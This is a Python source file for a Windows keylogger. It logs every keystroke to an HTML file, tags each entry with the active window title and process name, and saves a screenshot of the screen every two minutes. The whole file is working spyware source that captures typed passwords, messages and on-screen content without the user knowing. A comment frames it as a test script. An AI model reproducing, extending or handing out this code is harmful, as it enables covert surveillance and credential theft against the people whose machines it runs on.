import datetime
import os
import psutil
import win32gui
import win32process
from pynput import keyboard
from PIL import ImageGrab
from unidecode import unidecode

# Get the current directory
current_dir = os.getcwd()

# Set the x interval for taking screenshots (in seconds)
screenshot_interval = 120
last_screenshot_time = datetime.datetime.now()

# Track the current window title and process name
current_window_title = None
current_process_name = None

# Create the HTML log file but for some reason I can't figure out how to add another div for the key-pressed without adding a new line
log_file = open(os.path.join(current_dir, "keystrokes.html"), "w", encoding="utf-8")
log_file.write('<html>\n<head>\n<meta charset="utf-8">\n<title>Keystrokes Log</title>\n<style>\n.highlight{background-color:#dedede;color:#000000;padding:0.2em;margin-top:0.2cm;margin-bottom:0.2cm;font-family:Arial, Helvetica, sans-serif;}\n</style>\n</head>\n<body>\n')


# This function gets called every time a key is pressed
def on_press(key):
    global current_window_title, current_process_name, last_screenshot_time
    try:
        # Get the title and process name of the foreground window
        window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        process_name = psutil.Process(pid[-1]).name()

        # If the window or process has changed, write them to the log file
        if window_title != current_window_title or process_name != current_process_name:
            if current_window_title is not None:
                log_file.write("</div>\n")

            current_window_title = window_title
            current_process_name = process_name
            now = datetime.datetime.now()
            log_file.write(f'<div class="highlight">{now.strftime("%A, %B %d, %Y [%I:%M %p]")} {current_process_name} - {current_window_title}</div>\n')
        
        if isinstance(key, keyboard.Key):
            # Handle special keys
            if key == keyboard.Key.space:
                key_char = " "
            elif key == keyboard.Key.enter:
                key_char = "[Enter]"
            elif key == keyboard.Key.tab:
                key_char = "[Tab]"
            elif key == keyboard.Key.backspace:
                key_char = "[Backspace]"
            elif key == keyboard.Key.shift_l:
                key_char = ""
            elif key == keyboard.Key.shift_r:
                key_char = ""
            elif key == keyboard.Key.alt_l:
                key_char = "[L Alt]"
            elif key == keyboard.Key.alt_r:
                key_char = "[R Alt]"
            elif key == keyboard.Key.ctrl_l:
                key_char = "[L Ctrl]"
            elif key == keyboard.Key.ctrl_r:
                key_char = "[R Ctrl]"
            elif key == keyboard.Key.right:
                key_char = "[Right]"
            elif key ==  keyboard.Key.left:
                key_char = "[Left]"
            elif key == keyboard.Key.up:
                key_char = "[Up]"
            elif key ==  keyboard.Key.down:
                key_char = "[Down]"
            else:
                # Handle normal keys
                if hasattr(key, 'char'):
                    key_char = key.char
                else: # So this part and below fixes the charmap problem in the logs while the other fixes the console one.
                    key_char = str(key)
                if key_char == '\u25cf':
                    key_char = ''
        else:
            key_char = str(key.char)
            if keyboard.Controller().shift_pressed:
                key_char = key_char.upper()
        key_char = unidecode(key_char)
        
        # Encode the output to utf-8
        log_file.write(key_char.encode("utf-8").decode())
        #log_file.write(f'<p class="key-pressed">{key_char.encode("utf-8").decode()}</p>')


        log_file.flush()

        # Take a screenshot if it's time
        if (datetime.datetime.now() - last_screenshot_time).seconds >= screenshot_interval:
            screenshot = ImageGrab.grab()
            screenshot.save(os.path.join(current_dir, f"screenshot_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"))
            last_screenshot_time = datetime.datetime.now()


    except Exception as e:
        print(f"Error: {e}")

# Set up a keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    try:
        while True:
            listener.join(0.1)
    except KeyboardInterrupt:
        pass

# Close the log file when we're done. I only did this because it's just a testing (Remove this part if you want to).
log_file.close() 
